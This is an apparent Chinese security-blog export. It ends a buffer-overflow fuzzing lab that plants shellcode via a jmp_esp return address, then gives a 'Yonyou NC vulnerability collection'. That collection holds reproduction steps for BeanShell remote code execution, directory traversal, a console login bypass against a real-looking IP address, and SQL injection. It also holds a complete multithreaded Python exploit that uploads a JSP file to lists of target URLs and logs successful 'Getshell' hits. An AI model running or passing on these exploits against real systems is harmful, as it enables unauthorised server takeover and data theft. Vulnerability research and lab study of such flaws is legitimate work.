<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565855329426.png" alt="1565855329426"></p>
</li>
<li><p>查看服务器日志，连续收到多次脏数据后直接退出</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565855341850.png" alt="1565855341850"></p>
</li>
<li><p>将<code>HomeFtpServer.exe</code>放进<code>Ollydbg</code>中，重新执行<code>fuzz</code>程序，获得程序崩溃信息，跳转到<code>kernel32.77E99ED8</code>处时发生异常</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565855374334.png" alt="1565855374334"></p>
</li>
</ol>
<h1 id="测试结论"><a href="#测试结论" class="headerlink" title="测试结论"></a>测试结论</h1><p>​        使用现成的<code>fuzz</code>攻击程序对目标主机进行<code>fuzz</code>攻击，可以使得FTP服务器崩溃；通过编写的<code>fuzz</code>源代码，也可以通过连接目标主机并发送脏数据包实现<code>fuzz</code>攻击，达到让目标服务器崩溃的效果，通过<code>ollydbg</code>分析该过程时，只能找到程序崩溃的位置，并没有找到程序崩溃的原因，虽然理论上是重复插入了相同的数据导致<code>FTP</code>服务器异常。</p>
<h1 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h1><p>开发一个针对文件溢出的目标程序的<code>fuzz</code>程序，使目标程序崩溃。要求生成攻击测试文件并通过程序自动加载，并确定从哪个文件开始出现程序崩溃，给出被攻击缓冲区实际大小，并植入一个<code>shellcode</code>（功能不限）</p>
<ol>
<li><p>使用<code>IDA</code>打开程序，反汇编得到反汇编代码，分析反汇编代码，发现<code>overflow_exe.exe</code>实现的功能是读取<code>password.txt</code>中的内容，与实现设定的正确密码<code>1234567</code>进行对比，若相同则输出<code>incorrect password!</code>，不同则输出<code>Congratulation! You have passed the verification!</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565855659005.png" alt="1565855659005"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565855664320.png" alt="1565855664320"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565855669129.png" alt="1565855669129"></p>
</li>
<li><p>运行程序，验证步骤一</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565855729470.png" alt="1565855729470"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565855764316.png" alt="1565855764316"></p>
</li>
<li><p>编写源代码，计算缓冲区大小</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">rpwd = <span class="string">&quot;Congratulation! You have passed the verification!\n&quot;</span></span><br><span class="line">wpwd = <span class="string">&quot;incorrect password!\n&quot;</span></span><br><span class="line"></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="number">100</span>:</span><br><span class="line">	fp = <span class="built_in">open</span>(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;w+&quot;</span>)</span><br><span class="line">	fp.write(<span class="string">&quot;aaaa&quot;</span>*i*<span class="number">100</span>)</span><br><span class="line">	fp.close()</span><br><span class="line">	p = os.popen(<span class="string">&quot;overflow_exe.exe&quot;</span>)</span><br><span class="line">	text = p.readlines()</span><br><span class="line">	string = <span class="string">&quot;&quot;</span>.join(text)</span><br><span class="line">	<span class="keyword">if</span> string == rpwd <span class="keyword">or</span> string == wpwd:</span><br><span class="line">		i+=<span class="number">1</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;程序运行大约%d次后崩溃!&quot;</span>%(i*<span class="number">4</span>*<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">j = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> j &lt; <span class="number">100</span>:</span><br><span class="line">	fp = <span class="built_in">open</span>(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;w+&quot;</span>)</span><br><span class="line">	fp.write(<span class="string">&quot;aaaa&quot;</span>*(i-<span class="number">1</span>)*<span class="number">100</span>+<span class="string">&quot;aaaa&quot;</span>*j*<span class="number">10</span>)</span><br><span class="line">	fp.close()</span><br><span class="line">	p = os.popen(<span class="string">&quot;overflow_exe.exe&quot;</span>)</span><br><span class="line">	text = p.readlines()</span><br><span class="line">	string = <span class="string">&quot;&quot;</span>.join(text)</span><br><span class="line">	<span class="keyword">if</span> string == rpwd <span class="keyword">or</span> string == wpwd:</span><br><span class="line">		j+=<span class="number">1</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;程序运行大约%d次后崩溃!&quot;</span>%((i-<span class="number">1</span>)*<span class="number">4</span>*<span class="number">100</span>+j*<span class="number">4</span>*<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">t = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> t &lt; <span class="number">100</span>:</span><br><span class="line">	fp = <span class="built_in">open</span>(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;w+&quot;</span>)</span><br><span class="line">	fp.write(<span class="string">&quot;aaaa&quot;</span>*(i-<span class="number">1</span>)*<span class="number">100</span>+<span class="string">&quot;aaaa&quot;</span>*(j-<span class="number">1</span>)*<span class="number">10</span>+<span class="string">&quot;a&quot;</span>*t)</span><br><span class="line">	fp.close()</span><br><span class="line">	p = os.popen(<span class="string">&quot;overflow_exe.exe&quot;</span>)</span><br><span class="line">	text = p.readlines()</span><br><span class="line">	string = <span class="string">&quot;&quot;</span>.join(text)</span><br><span class="line">	<span class="keyword">if</span> string == rpwd <span class="keyword">or</span> string == wpwd:</span><br><span class="line">		t+=<span class="number">1</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;程序运行%d次后崩溃!&quot;</span>%((i-<span class="number">1</span>)*<span class="number">4</span>*<span class="number">100</span>+(j-<span class="number">1</span>)*<span class="number">4</span>*<span class="number">10</span>+t)</span><br></pre></td></tr></table></figure></li>
<li><p>运行脚本，得到缓冲区大小为<code>8197</code> </p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565856034118.png" alt="1565856034118"></p>
</li>
<li><p>构造<code>shellcode</code>，先输入<code>8200</code>个脏数据，构造<code>shellcode</code>后程序如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">rpwd = <span class="string">&quot;Congratulation! You have passed the verification!\n&quot;</span></span><br><span class="line">wpwd = <span class="string">&quot;incorrect password!\n&quot;</span></span><br><span class="line"></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="number">100</span>:</span><br><span class="line">	fp = <span class="built_in">open</span>(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;w+&quot;</span>)</span><br><span class="line">	fp.write(<span class="string">&quot;aaaa&quot;</span>*i*<span class="number">100</span>)</span><br><span class="line">	fp.close()</span><br><span class="line">	p = os.popen(<span class="string">&quot;overflow_exe.exe&quot;</span>)</span><br><span class="line">	text = p.readlines()</span><br><span class="line">	string = <span class="string">&quot;&quot;</span>.join(text)</span><br><span class="line">	<span class="keyword">if</span> string == rpwd <span class="keyword">or</span> string == wpwd:</span><br><span class="line">		i+=<span class="number">1</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;程序运行大约%d次后崩溃!&quot;</span>%(i*<span class="number">4</span>*<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">j = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> j &lt; <span class="number">100</span>:</span><br><span class="line">	fp = <span class="built_in">open</span>(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;w+&quot;</span>)</span><br><span class="line">	fp.write(<span class="string">&quot;aaaa&quot;</span>*(i-<span class="number">1</span>)*<span class="number">100</span>+<span class="string">&quot;aaaa&quot;</span>*j*<span class="number">10</span>)</span><br><span class="line">	fp.close()</span><br><span class="line">	p = os.popen(<span class="string">&quot;overflow_exe.exe&quot;</span>)</span><br><span class="line">	text = p.readlines()</span><br><span class="line">	string = <span class="string">&quot;&quot;</span>.join(text)</span><br><span class="line">	<span class="keyword">if</span> string == rpwd <span class="keyword">or</span> string == wpwd:</span><br><span class="line">		j+=<span class="number">1</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;程序运行大约%d次后崩溃!&quot;</span>%((i-<span class="number">1</span>)*<span class="number">4</span>*<span class="number">100</span>+j*<span class="number">4</span>*<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">t = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> t &lt; <span class="number">100</span>:</span><br><span class="line">	fp = <span class="built_in">open</span>(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;w+&quot;</span>)</span><br><span class="line">	fp.write(<span class="string">&quot;aaaa&quot;</span>*(i-<span class="number">1</span>)*<span class="number">100</span>+<span class="string">&quot;aaaa&quot;</span>*(j-<span class="number">1</span>)*<span class="number">10</span>+<span class="string">&quot;a&quot;</span>*t)</span><br><span class="line">	fp.close()</span><br><span class="line">	p = os.popen(<span class="string">&quot;overflow_exe.exe&quot;</span>)</span><br><span class="line">	text = p.readlines()</span><br><span class="line">	string = <span class="string">&quot;&quot;</span>.join(text)</span><br><span class="line">	<span class="keyword">if</span> string == rpwd <span class="keyword">or</span> string == wpwd:</span><br><span class="line">		t+=<span class="number">1</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;程序运行%d次后崩溃!&quot;</span>%((i-<span class="number">1</span>)*<span class="number">4</span>*<span class="number">100</span>+(j-<span class="number">1</span>)*<span class="number">4</span>*<span class="number">10</span>+t)</span><br><span class="line"></span><br><span class="line">jmp_esp = <span class="string">&quot;\x8B\x94\xF8\x77&quot;</span></span><br><span class="line">shellcode = <span class="string">&quot;\x33\xDB\x53\x68\x31\x32\x33\x34\x68\x41\x42\x43\x44\x8B\xC4\x53\x50\x50\x53\xB8\x68\x3D\xE2\x77\xFF\xD0\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"></span><br><span class="line">fp = <span class="built_in">open</span>(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;w+&quot;</span>)</span><br><span class="line">fp.write(<span class="string">&quot;aaaa&quot;</span>*(i-<span class="number">1</span>)*<span class="number">100</span> + <span class="string">&quot;aaaa&quot;</span>*(j-<span class="number">1</span>)*<span class="number">10</span> + <span class="string">&quot;a&quot;</span>*t + <span class="string">&quot;a&quot;</span>*<span class="number">3</span> + jmp_esp + shellcode)</span><br><span class="line">fp.close()</span><br><span class="line">p = os.popen(<span class="string">&quot;overflow_exe.exe&quot;</span>)</span><br></pre></td></tr></table></figure></li>
<li><p>运行<code>python</code>脚本，植入<code>shellcode</code>成功</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565856219819.png" alt="1565856219819"></p>
</li>
<li><p>最终生成的<code>password.txt</code>文件如下</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565856255135.png" alt="1565856255135"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>软件安全实验</category>
      </categories>
      <tags>
        <tag>漏洞挖掘</tag>
        <tag>模糊测试</tag>
        <tag>fuzz</tag>
      </tags>
  </entry>
  <entry>
    <title>用友NC漏洞集合</title>
    <url>/%E7%94%A8%E5%8F%8BNC%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88.html</url>
    <content><![CDATA[<h2 id="【CNVD-2021-30167】-用友NC-BeanShell远程代码执行漏洞"><a href="#【CNVD-2021-30167】-用友NC-BeanShell远程代码执行漏洞" class="headerlink" title="【CNVD-2021-30167】 用友NC BeanShell远程代码执行漏洞"></a>【CNVD-2021-30167】 用友NC BeanShell远程代码执行漏洞</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>用友NC是面向集团企业的管理软件，其在同类市场占有率中达到亚太第一。</p>
<span id="more"></span>

<h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>该漏洞是由于用友NC对外开放了BeanShell测试接口，并没有设置权限，攻击者可利用该漏洞在未授权的情况下，构造恶意数据，执行任意代码，最终获取服务器最高权限。</p>
<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>用友NC6.5版本</p>
<h3 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h3><ol>
<li><p>无需登录，直接访问URL<code>http://xxx.xxx.xxx.xxx/servlet/~ic/bsh.servlet.BshServlet</code>进入BeanShell Test Servlet页面</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912222806.png"></p>
</li>
<li><p>BeanShell Test Servlet页面有执行代码的接口，输入payload如：<code>exec("whoami");</code>即可看到命令执行成功。</p>
</li>
</ol>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912223044.png"></p>
<ol start="3">
<li>该漏洞为第三方jar包的漏洞导致的。如果存在<code>servlet/~ic/bsh.servlet.BshServlet</code>路径且能正常访问，则大概率会存在该漏洞。</li>
</ol>
<h2 id="用友ERP-NC目录遍历-文件读取漏洞"><a href="#用友ERP-NC目录遍历-文件读取漏洞" class="headerlink" title="用友ERP-NC目录遍历+文件读取漏洞"></a>用友ERP-NC目录遍历+文件读取漏洞</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>用友<code>ERP-NC</code>存在目录遍历漏洞，攻击者可以通过目录遍历获取敏感文件信息</p>
<h3 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h3><p>用友ERP-NC</p>
<h3 id="复现过程-1"><a href="#复现过程-1" class="headerlink" title="复现过程"></a>复现过程</h3><ol>
<li>无需登录，直接访问URL<code>http://xxx.xxx.xxx.xxx/NCFindWeb?service=IPreAlertConfigService&amp;filename=</code>可查看当前目录</li>
</ol>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912223133.png"></p>
<ol start="2">
<li>在filename后面加上文件名即可查看内容</li>
</ol>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912223015.png"></p>
<ol start="3">
<li>尝试目录穿越读取敏感文件，发现网上大部分用友NC已经无法实现目录穿越，需在特定条件下才能满足，同时该漏洞的修复版本并位公开。</li>
<li>该漏洞为第三方jar包的漏洞导致的。如果存在<code>/NCFindWeb?service=IPreAlertConfigService&amp;filename=</code>路径且能正常访问，则则存在该漏洞。</li>
</ol>
<h2 id="用友NC控制台密码绕过漏洞"><a href="#用友NC控制台密码绕过漏洞" class="headerlink" title="用友NC控制台密码绕过漏洞"></a>用友NC控制台密码绕过漏洞</h2><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>用友<code>ERP-NC</code>控制台存在控制台密码绕过漏洞，攻击者可以输入默认密码123456或者抓取更改返回数据包实现任意用户登录。</p>
<h3 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h3><p>用友NC</p>
<h3 id="复现过程-2"><a href="#复现过程-2" class="headerlink" title="复现过程"></a>复现过程</h3><ol>
<li><p>访问URL<code>http://183.252.48.82:81/uapws/index.jsp</code>进入控制台登录页面</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912223229.png"></p>
</li>
<li><p>如果password项存在内容，则直接点击OK即可登录，如果不存在内容，则输入任意内容，后更改返回数据包由0变为1即可实现登录。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912223315.png"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912223333.png"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912223359.png"></p>
<ol start="3">
<li>如上图所示，成功登录后台。</li>
</ol>
<h2 id="用友NC-Cloud-FS文件管理SQL注入漏洞"><a href="#用友NC-Cloud-FS文件管理SQL注入漏洞" class="headerlink" title="用友NC Cloud FS文件管理SQL注入漏洞"></a>用友NC Cloud FS文件管理SQL注入漏洞</h2><h3 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>用友 <code>NCCloud FS</code> 文件管理登录页面对用户名参数没有过滤，存在 <code>SQL</code> 注入。</p>
<h3 id="影响版本-3"><a href="#影响版本-3" class="headerlink" title="影响版本"></a>影响版本</h3><p>用友NC</p>
<h3 id="复现过程-3"><a href="#复现过程-3" class="headerlink" title="复现过程"></a>复现过程</h3><ol>
<li><p>访问文件服务器管理登录页面</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912223709.png"></p>
</li>
<li><p>输入任意用户名和密码，提交登录后截取数据包</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912223751.png"></p>
<p>发现为POST请求，说明该漏洞已经修复。如果为get请求则存在SQL注入。</p>
</li>
</ol>
</li>
</ol>
<h2 id="用友NC-6-5未授权文件上传漏洞"><a href="#用友NC-6-5未授权文件上传漏洞" class="headerlink" title="用友NC 6.5未授权文件上传漏洞"></a>用友NC 6.5未授权文件上传漏洞</h2><h3 id="漏洞描述-3"><a href="#漏洞描述-3" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>用友 <code>NC6.5</code> 版本存在未授权文件上传漏洞，攻击者可以未授权上传任意文件，进而获取服务端控制权限。</p>
<h3 id="4-2-影响版本"><a href="#4-2-影响版本" class="headerlink" title="4.2. 影响版本"></a>4.2. 影响版本</h3><p>用友NC6.5版本</p>
<h3 id="4-3-复现过程"><a href="#4-3-复现过程" class="headerlink" title="4.3.  复现过程"></a>4.3.  复现过程</h3><ol>
<li><p>查看页面<code>/servlet/~uapss/com.yonyou.ante.servlet.FileReceiveServlet</code>内容如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">handleRequest</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> {</span><br><span class="line">    ServletInputStream servletInputStream;</span><br><span class="line">    ServletOutputStream servletOutputStream;</span><br><span class="line">    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">FileOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">OutputStream</span> <span class="variable">rtnos</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">""</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">try</span> {</span><br><span class="line">      servletInputStream = req.getInputStream();</span><br><span class="line">      servletOutputStream = resp.getOutputStream();</span><br><span class="line">      ois = <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>((InputStream)servletInputStream);</span><br><span class="line">      Map&lt;String, Object&gt; metaInfo = <span class="literal">null</span>;</span><br><span class="line">      metaInfo = (Map&lt;String, Object&gt;)ois.readObject();</span><br><span class="line">      path = (String)metaInfo.get(<span class="string">"TARGET_FILE_PATH"</span>);</span><br><span class="line">      fileName = (String)metaInfo.get(<span class="string">"FILE_NAME"</span>);</span><br><span class="line">      <span class="type">File</span> <span class="variable">outFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(path, fileName);</span><br><span class="line">      os = <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(outFile);</span><br><span class="line">      <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">      <span class="type">int</span> <span class="variable">receiveCount</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((receiveCount = servletInputStream.read(buffer, <span class="number">0</span>, <span class="number">1024</span>)) != -<span class="number">1</span>)</span><br><span class="line">        os.write(buffer, <span class="number">0</span>, receiveCount); </span><br><span class="line">      os.flush();</span><br><span class="line">      servletOutputStream.write(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p>可以上传一个反序列化的map，使用TARGET_FILE_PATH和FILE_NAME键确定文件位置，再向后拼接文件内容，实现文件上传。</p>
</li>
<li><p>利用poc如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threadpool</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line">proxies = {<span class="string">'http'</span>: <span class="string">'http://localhost:8080'</span>, <span class="string">'https'</span>: <span class="string">'http://localhost:8080'</span>}</span><br><span class="line">header = {</span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"</span>,</span><br><span class="line">    <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>,</span><br><span class="line">    <span class="string">"Referer"</span>: <span class="string">"https://google.com"</span>,</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">multithreading</span>(<span class="params">funcname, filename=<span class="string">"url.txt"</span>, pools=<span class="number">5</span></span>):</span><br><span class="line">    works = []</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">            func_params = [i.rstrip(<span class="string">"\n"</span>)]</span><br><span class="line">            works.append((func_params, <span class="literal">None</span>))</span><br><span class="line">    pool = threadpool.ThreadPool(pools)</span><br><span class="line">    reqs = threadpool.makeRequests(funcname, works)</span><br><span class="line">    [pool.putRequest(req) <span class="keyword">for</span> req <span class="keyword">in</span> reqs]</span><br><span class="line">    pool.wait()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wirte_targets</span>(<span class="params">vurl, filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">"a+"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(vurl + <span class="string">"\n"</span>)</span><br><span class="line">        <span class="keyword">return</span> vurl</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">u</span>):</span><br><span class="line">    uploadHeader = {</span><br><span class="line">        <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"</span>,</span><br><span class="line">        <span class="string">"Content-Type"</span>: <span class="string">"multipart/form-data;"</span>,</span><br><span class="line">        <span class="string">"Referer"</span>: <span class="string">"https://google.com"</span></span><br><span class="line">    }</span><br><span class="line">    uploadData = <span class="string">"\xac\xed\x00\x05\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x48\x61\x73\x68\x4d\x61\x70\x05\x07\xda\xc1\xc3\x16\x60\xd1\x03\x00\x02\x46\x00\x0a\x6c\x6f\x61\x64\x46\x61\x63\x74\x6f\x72\x49\x00\x09\x74\x68\x72\x65\x73\x68\x6f\x6c\x64\x78\x70\x3f\x40\x00\x00\x00\x00\x00\x0c\x77\x08\x00\x00\x00\x10\x00\x00\x00\x02\x74\x00\x09\x46\x49\x4c\x45\x5f\x4e\x41\x4d\x45\x74\x00\x09\x74\x30\x30\x6c\x73\x2e\x6a\x73\x70\x74\x00\x10\x54\x41\x52\x47\x45\x54\x5f\x46\x49\x4c\x45\x5f\x50\x41\x54\x48\x74\x00\x10\x2e\x2f\x77\x65\x62\x61\x70\x70\x73\x2f\x6e\x63\x5f\x77\x65\x62\x78"</span></span><br><span class="line">    shellFlag=<span class="string">"t0test0ls"</span></span><br><span class="line">    uploadData+=shellFlag</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        req1 = requests.post(u + <span class="string">"/servlet/FileReceiveServlet"</span>, headers=uploadHeader, verify=<span class="literal">False</span>, data=uploadData, timeout=<span class="number">25</span>)</span><br><span class="line">        <span class="keyword">if</span> req1.status_code == <span class="number">200</span> :</span><br><span class="line">            req3=requests.get(u+<span class="string">"/t00ls.jsp"</span>,headers=header, verify=<span class="literal">False</span>, timeout=<span class="number">25</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>  req3.text.index(shellFlag)&gt;=<span class="number">0</span>:</span><br><span class="line">                printFlag = <span class="string">"[Getshell]"</span> + u+<span class="string">"/t00ls.jsp"</span>  + <span class="string">"\n"</span></span><br><span class="line">                <span class="built_in">print</span> (printFlag)</span><br><span class="line">                wirte_targets(printFlag, <span class="string">"vuln.txt"</span>)</span><br><span class="line">    <span class="keyword">except</span> :</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="comment">#print(printFlag, end="")</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">len</span>(sys.argv)) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">'useage : python'</span> +<span class="built_in">str</span>(sys.argv[<span class="number">0</span>]) + <span class="string">' -h'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        parser =argparse.ArgumentParser()</span><br><span class="line">        parser.description =<span class="string">'YONYOU UC 6.5 FILE UPLOAD!'</span></span><br><span class="line">        parser.add_argument(<span class="string">'-u'</span>,<span class="built_in">help</span>=<span class="string">"url -&gt; example [url]http://127.0.0.1[/url]"</span>,<span class="built_in">type</span>=<span class="built_in">str</span>,dest=<span class="string">'check_url'</span>)</span><br><span class="line">        parser.add_argument(<span class="string">'-r'</span>,<span class="built_in">help</span>=<span class="string">"url list to file"</span>,<span class="built_in">type</span>=<span class="built_in">str</span>,dest=<span class="string">'check_file'</span>)</span><br><span class="line">        args =parser.parse_args()</span><br><span class="line">        <span class="keyword">if</span> args.check_url:</span><br><span class="line">            exp(args.check_url)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(args.check_file):</span><br><span class="line">            multithreading(exp, args.check_file, <span class="number">8</span>)</span><br></pre></td></tr></table></figure></li>
<li><p>利用POC成功上传t00ls.jsp文件</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912223947.png"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912224230.png"></p>
</li>
<li><p>可以通过该漏洞实现上传webshell。</p>
</li>
</ol>
<h2 id="用友U8-OA-SQL注入漏洞"><a href="#用友U8-OA-SQL注入漏洞" class="headerlink" title="用友U8 OA SQL注入漏洞"></a>用友U8 OA SQL注入漏洞</h2><h3 id="漏洞描述-4"><a href="#漏洞描述-4" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>用友 <code>U8 OA test.jsp</code> 文件存在 <code>SQL</code> 注入漏洞。</p>
<h3 id="影响版本-4"><a href="#影响版本-4" class="headerlink" title="影响版本"></a>影响版本</h3><p>用友 U8 OA</p>
<h3 id="复现过程-4"><a href="#复现过程-4" class="headerlink" title="复现过程"></a>复现过程</h3><ol>
<li><p>检测漏洞URL为<code>/yyoa/common/js/menu/test.jsp?doType=101&amp;S1=(SELECT%20MD5(1))</code>，访问链接显示如下，存在SQL注入漏洞</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912224212.png"></p>
</li>
<li><p>使用SQLmap尝试SQL注入测试，显示存在漏洞。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912224146.png"></p>
</li>
</ol>
<h2 id="综合利用EXP"><a href="#综合利用EXP" class="headerlink" title="综合利用EXP"></a>综合利用EXP</h2><p>github上有用友NC的综合利用EXP：<a href="https://github.com/asdasdqkq1/yonyou-nc-exp">https://github.com/asdasdqkq1/yonyou-nc-exp</a></p>
<p>涉及漏洞包括：</p>
<ul>
<li>【CNVD-2021-30167】 用友NC BeanShell远程代码执行漏洞</li>
<li>用友ERP-NC目录遍历+文件读取漏洞</li>
<li>用友NC 6.5未授权文件上传漏洞（RCE）</li>
<li>用友ERP SQL注入漏洞（该漏洞目前网站基本已经不存在，故前面无法复现，没有介绍）</li>
<li>用友U8 OA SQL注入漏洞</li>
</ul>
<p>测试结果如下：</p>
